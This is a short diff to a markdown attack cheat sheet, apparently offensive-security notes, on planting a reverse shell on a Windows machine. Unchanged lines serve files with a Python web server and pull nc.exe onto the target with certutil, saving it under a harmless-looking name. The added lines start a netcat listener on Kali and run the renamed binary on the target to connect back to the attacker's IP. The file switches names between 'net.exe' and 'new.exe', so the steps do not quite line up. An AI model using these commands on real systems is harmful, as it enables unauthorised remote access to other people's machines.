@@ -163,6 +163,10 @@ __Download the reverse shell in windows__
     - __`python -m SimpleHTTPServer 80`__
   - > __Go to the target windows system type the below command in the `cmd`__
     - __`certutil -urlcache -f http://127.0.0.1/nc.exe net.exe`__
+  - > __run the below command in kali linux__
+    > __`nc -nvlp 1234`__
+  - > __we need to run the file in target system__
+    - __`new.exe -nv <your ip> 1234`__
 
 
 
